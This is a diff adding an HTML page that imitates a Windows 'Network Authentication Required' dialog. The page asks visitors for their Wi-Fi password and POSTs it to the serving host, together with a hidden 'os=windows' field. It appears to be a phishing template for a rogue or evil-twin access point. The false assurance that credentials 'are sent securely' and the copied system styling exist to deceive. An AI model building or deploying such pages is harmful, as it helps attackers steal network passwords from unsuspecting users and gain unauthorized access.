@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Network Authentication</title>
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  body {
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    background: #f3f3f3;
+    min-height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 20px;
+  }
+  .dialog {
+    background: #fff;
+    border: 1px solid #d1d1d1;
+    border-radius: 4px;
+    width: 100%;
+    max-width: 400px;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.18);
+  }
+  .title-bar {
+    background: #0078d4;
+    padding: 12px 16px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    border-radius: 3px 3px 0 0;
+  }
+  .title-bar span {
+    color: #fff;
+    font-size: 13px;
+    font-weight: 400;
+  }
+  .body { padding: 24px 24px 16px; }
+  .icon-row {
+    display: flex;
+    align-items: flex-start;
+    gap: 16px;
+    margin-bottom: 20px;
+  }
+  .msg-title {
+    font-size: 14px;
+    font-weight: 600;
+    color: #1a1a1a;
+    margin-bottom: 6px;
+  }
+  .msg-body { font-size: 13px; color: #444; line-height: 1.5; }
+  .field-label {
+    font-size: 13px;
+    color: #1a1a1a;
+    margin-bottom: 4px;
+    display: block;
+  }
+  .field-input {
+    width: 100%;
+    padding: 6px 8px;
+    border: 1px solid #8a8a8a;
+    border-radius: 2px;
+    font-size: 13px;
+    font-family: inherit;
+    color: #1a1a1a;
+    outline: none;
+    margin-bottom: 20px;
+  }
+  .field-input:focus { border-color: #0078d4; box-shadow: 0 0 0 1px #0078d4; }
+  .btn-row {
+    display: flex;
+    justify-content: flex-end;
+    gap: 8px;
+    padding: 12px 24px 16px;
+    border-top: 1px solid #e5e5e5;
+  }
+  .btn {
+    padding: 5px 20px;
+    font-size: 13px;
+    font-family: inherit;
+    cursor: pointer;
+    border-radius: 2px;
+    min-width: 75px;
+  }
+  .btn-ok {
+    background: #0078d4;
+    color: #fff;
+    border: 1px solid #0078d4;
+  }
+  .btn-ok:hover { background: #006cc1; }
+  .btn-cancel-win {
+    background: #f3f3f3;
+    color: #1a1a1a;
+    border: 1px solid #adadad;
+  }
+  .btn-cancel-win:hover { background: #e5e5e5; }
+</style>
+</head>
+<body>
+<div class="dialog">
+  <div class="title-bar">
+    <svg width="16" height="16" viewBox="0 0 16 16" fill="none">
+      <path d="M8 1a7 7 0 1 0 0 14A7 7 0 0 0 8 1zm0 3a1 1 0 1 1 0 2 1 1 0 0 1 0-2zm0 3.5c.28 0 .5.22.5.5v3a.5.5 0 0 1-1 0V8c0-.28.22-.5.5-.5z" fill="#fff"/>
+    </svg>
+    <span>Network Authentication Required</span>
+  </div>
+  <div class="body">
+    <div class="icon-row">
+      <svg width="32" height="32" viewBox="0 0 32 32" fill="none" flex-shrink="0">
+        <rect width="32" height="32" rx="4" fill="#0078d4"/>
+        <path d="M16 7a4 4 0 0 0-4 4v2H10a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-8a2 2 0 0 0-2-2h-2v-2a4 4 0 0 0-4-4zm0 2a2 2 0 0 1 2 2v2h-4v-2a2 2 0 0 1 2-2zm0 7a2 2 0 1 1 0 4 2 2 0 0 1 0-4z" fill="#fff"/>
+      </svg>
+      <div>
+        <div class="msg-title">Sign in to this network</div>
+        <div class="msg-body">Enter the password for this Wi-Fi network. Your credentials are sent securely.</div>
+      </div>
+    </div>
+    <form method="POST" action="/">
+      <input type="hidden" name="os" value="windows">
+      <label class="field-label" for="password">Password</label>
+      <input type="password" class="field-input" name="password" id="password"
+             autocomplete="current-password" autofocus>
+    </form>
+  </div>
+  <div class="btn-row">
+    <button type="button" class="btn btn-cancel-win" onclick="window.history.back()">Cancel</button>
+    <button type="submit" form="" class="btn btn-ok"
+            onclick="this.closest('.dialog').querySelector('form').submit()">OK</button>
+  </div>
+</div>
+</body>
+</html>
